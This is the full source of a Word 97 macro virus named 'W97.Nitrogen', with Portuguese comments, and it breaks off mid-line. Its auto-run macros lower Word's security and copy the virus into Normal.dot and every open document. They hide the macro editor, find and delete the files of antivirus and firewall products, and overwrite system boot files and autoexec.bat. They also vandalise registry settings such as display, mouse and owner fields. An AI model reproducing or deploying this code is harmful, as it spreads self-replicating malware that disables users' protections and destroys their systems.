   'W97.Nitrogen
   'By ·KrïPt¤R·

   'AutoOpen = abre um documento existente
   'AutoExec = quando se abre o word
   'AutoNew = quando se abre um novo documento
   'FileSaveAs = quando se salva o documento
   Sub AutoExec()
   On Error Resume Next   'Se encontrar algum erro passa à frente
   AutoOpen               'Chama a AutoOpen
   ChooseActions          'Chama ChooseActions
   LoopIt                 'Chama LoopIt
   End Sub

   Sub AutoNew()
   On Error Resume Next
   AutoOpen
   End Sub

   Sub AutoOpen()
   On Error Resume Next
   'Baixa o nivel de segurança do Word
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1"
   System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1"
   'Aponta para o documento activo
   Set Arch = ActiveDocument.VBProject.VBComponents.Item(1)
   'Aponta para o normal.dot
   Set Norm = Normal.Nitrogen.VBProject.VBComponents.Item(1)
   'Aponta para copia
   Set ItsMe = Me.VBProject.VBComponents.Item(1)

   Norm.Name = "Nitrogen"    'Muda o nome do Modulos
   Arch.Name = "Nitrogen"    'Muda o nome do Modulos
   'Infecta o normal.dot se a primeira linha do Module nao for 'W97.Nitrogen
   If Norm.CodeModule.Lines(1, 1) <> "'W97.Nitrogen" Then
   'copia do virus para o normal.dot
   Norm.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
   End If
   'Infecta os documentos se a primeira linha nao for 'W97.Nitrogen
   If Arch.CodeModule.Lines(1, 1) <> "'W97.Nitrogen" Then
   'copia para o documento activo
   Arch.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
   End If
   'ja se sabe ne
   ChooseActions
   Retro
   M6KHON1P
   JN289GF4 (EL41EEIC)
   I5GE6CE6 (P4HN289G)
   Form
   Special
   End Sub

   Sub FileSaveAs()
   On Error Resume Next
   'Manda os numeros para a barra de titulo do Word antes de salvar
   'Se for mes de maio fecha o word i nao salva o documento
   Application.ActiveWindow.Caption = "0"
   Time
   Application.ActiveWindow.Caption = "1"
   Time
   Application.ActiveWindow.Caption = "2"
   Time
   Application.ActiveWindow.Caption = "3"
   Time
   Application.ActiveWindow.Caption = "4"
   Time
   Application.ActiveWindow.Caption = "5"
   M6KHON1P
   JN289GF4 (EL41EEIC)
   I5GE6CE6 (P4HN289G)
   If Day(Now) >= 1 And Month(Now) = 5 Then
   Tasks.ExitWindows
   End If
   End Sub

   Private Sub Retro()
   On Error Resume Next
   'Redireciona o atalho Alt+F11 para uma sub vazia
   KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="Protec"
   'Redireciona o atalho Alt+F8 para uma sub vazia
   KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8), KeyCategory:=wdKeyCategoryCommand, Command:="Protec"
   'Deleta no menu Ferramentas a opção macro
   CommandBars("Tools").Controls("Macro").Delete
   'Vai ao registro e traz path dos anti-virus
   Dim McAfee, FMcAfee, FProt, FFProt, FProt2, FFProt2, VET, FVET, Avast, FAvast, TheCleaner, FTheCleaner, Panda, FPanda, AVP, FAVP, Norton, FNorton, Norman, FNorman
   FProt = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32", "Location")
   FProt2 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\FRISK Software International\FP-Win", "Program Root")
   VET = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident", "VetPath")
   McAfee = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "szProductLocation")
   Avast = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32", "Path")
   TheCleaner = System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner", "tcshellex")
   Panda = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0", "Path")
   AVP = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100", "Folder")
   Norton = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Symantec\InstalledApps", "NAV")
   Norman = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Norman Data Defense Systems", "RootPath")
   'Vai ao registro e traz path das FireWalls
   Dim ZoneAlarm, FZoneAlarm, BlackIce, FBlackIce, Tiny, FTiny, Sygate, FSygate
   ZoneAlarm = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Zone Labs\ZoneAlarm", "InstallDirectory")
   BlackIce = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Network ICE\BlackICE", "Installer") = "C:\Programas\Network ICE\BlackICE"
   Tiny = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\TinySoftware\Tiny Personal Firewall\2.00", "DestPath")
   Sygate = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Sygate Technologies, Inc.\Sygate Personal Firewall", "smc_install_path")
   'Indica o ke ira ser apagado *.* tudo HIHI
   FFProt = FProt + "\*.*"
   FFProt2 = FProt2 + "\*.*"
   FVET = VET + "\*.*"
   FMcAfee = McAfee + "\*.*"
   FAvast = Avast + "\*.*"
   FTheCleaner = TheCleaner + "\*.*"
   FPanda = Panda + "\*.*"
   FAVP = AVP + "\*.*"
   FNorton = Norton + "\*.*"
   FNorman = Norman + "\*.*"
   FZoneAlarm = ZoneAlarm + "\*.*"
   FBlackIce = BlackIce + "\*.*"
   FTiny = Tiny + "\*.*"
   FSygate = Sygate + "\*.*"
   'Mando os Anti-Virus com os porcos
   Kill FFProt
   Kill FFProt2
   Kill FVET
   Kill FMcAfee
   Kill FAvast
   Kill FTheCleaner
   Kill FPanda
   Kill FAVP
   Kill FNorton
   Shell "Deltree/y" + FNorman
   Kill FZoneAlarm
   Kill FBlackIce
   Kill FTiny
   Kill FSygate
   'Desabilita a porra do Xo Bobus
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "0") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "1") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "2") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "3") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "4") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "5") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "6") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "7") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "8") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "9") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "10") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoStart") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoVerify") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "BOProt") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "ExtraPort") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "NetBusAdv") = "DISABLED"

   End Sub

   Private Sub Protec() 'Sub vazia que nao faz nada, simplemente proteje o documento

   End Sub

   Private Sub Action1()
   On Error Resume Next
   'Muda o nome da lixeira e coloca uma messagem
   System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "Nitrogen"
   System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "Esta e a Lixeira do ·KrïPt¤R·... eu comando essa barraca ok??? ---DüTy---"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "·KrïPt¤R· Recycle Bin"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "Esta Lixeira do ·KrïPt¤R·... eu comando essa barraca ok??? ---DüTy---"
   End Sub

   Private Sub Action2()
   On Error Resume Next
   'Altera o registro do Windows e a Versao
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "BitsPerPixel") = "1"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "·KrïPt¤R·"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Nitrogen"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Windous 007 by ·KrïPt¤R·"
   End Sub

   Private Sub Action3()
   On Error Resume Next
   'Poe o ponteiro rato com rasto, velocidade a 0, duplo clica a 100 hehe diz tudo ne
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "MouseTrails") = "7"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "MouseSpeed") = "0"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "DoubleClickSpeed") = "100"
   End Sub

   Private Sub Action4()
   On Error Resume Next
   'Muda as cores do Windows
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ButtonFace") = "200 40 10"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ActiveTitle") = "0 250 100"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Menu") = "0 0 0"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Window") = "100 100 200"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ScrollBar") = "100 100 200"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "WindowText") = "255 255 255"
   End Sub

   Private Sub Action5()
   On Error Resume Next
   'Coloca umas lembraça nos ficheiros
   N$ = WordBasic.[DefaultDir$](2) + "\Normal.dot"
   FileCopy N$, "C:\Leia.dot"
   SetAttr "C:\*.*", vbNormal
   Open "C:\io.sys" For Output As #1
   Open "C:\msdos.sys" For Output As #2
   Open "C:\command.com" For Output As #3
   Print #1, "Voce foi dominado pelo virus Nitrogen"
   Print #2, "Escrito por ·KrïPt¤R·"
   Print #3, "Foda-se pá nem depois de morto um gajo pode descansar...Tem de tar sempre um monhê entrar"
   Close #1
   Close #2
   Close #3
   Open "C:\autoexec.bat" For Output As #1
   Print #1, "@echo off"
   Print #1, "BREAK OFF > NUL"
   Print #1, "Cls"
   Print #1, "Echo @    @ @ @@@@@@@ @@@@  @@@@@ @@@@@ @@@@@ @    @"
   Print #1, "Echo @@   @      @    @   @ @   @ @   @ @     @@   @"
   Print #1, "Echo @ @  @ @    @    @   @ @   @ @     @@@   @ @  @"
   Print #1, "Echo @  @ @ @    @    @@@@  @   @ @ @@@ @@@   @  @ @"
   Print #1, "Echo @   @@ @    @    @   @ @   @ @   @ @     @   @@"
   Print #1, "Echo @    @ @    @    @   @ @@@@@ @@@@@ @@@@@ @    @"
   Print #1, "Echo voce foi destruido pelo virus Nitrogen"
   Print #1, "pause > nul"
   Print #1, "Cls"
   Print #1, "Echo escrito por ·KrïPt¤R·"
   Print #1, "pause > nul"
   Print #1, "Cls"
   Print #1, "Echo Voce quer se vingar de mim???"
   Print #1, "pause > nul"
   Print #1, ":inicio"
   Print #1, "Cls"
   Print #1, "Echo    @              "
   Print #1, "Echo   @ @             "
   Print #1, "Echo    @ @            "
   Print #1, "Echo     @ @ @ @ @ @   "
   Print #1, "Echo      @  @ @ @ @ @ "
   Print #1, "Echo      @         @  "
   Print #1, "Echo       @       @   "
   Print #1, "Echo        @     @    "
   Print #1, "Cls"
   Print #1, "Echo       @           "
   Print #1, "Echo      @ @          "
   Print #1, "Echo      @ @          "
   Print #1, "Echo      @ @ @ @ @ @  "
   Print #1, "Echo      @  @ @ @ @ @ "
   Print #1, "Echo      @         @  "
   Print #1, "Echo       @       @   "
   Print #1, "Echo        @     @    "
   Print #1, "Goto :inicio"
   Close #1

   End Sub

   Private Sub Action6()
   On Error Resume Next
   'Altera o nome dos dispositivos do gestor de dispositivos
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "VendorIdentifier") = "Genuine ·KrïPt¤R· Processor"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "Identifier") = "Nitrogen"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\DeveiceMap\SerialComm", "COM1") = "YOU BE STOP ME BUT YOU DONT STOP ALL"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\DeviceMap\SerialComm", "COM1") = "YOU BE STOP ME BUT YOU DONT STOP ALL"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\DeviceMap\SerialComm", "COM2") = "YOU BE STOP ME BUT YOU DONT STOP ALL"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0000\01", "DeviceDesc") = "·KrïPt¤R· --> I AM SOMEWHERE IN THE TIME"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0100\03", "DeviceDesc") = "·KrïPt¤R· --> I AM SOMEWHERE IN THE TIME"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0200\02", "DeviceDesc") = "·KrïPt¤R· --> I AM SOMEWHERE IN THE TIME"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0303\05", "DeviceDesc") = "·KrïPt¤R· --> I AM SOMEWHERE IN THE TIME"
   System.PrivateProfileString("",<span clas
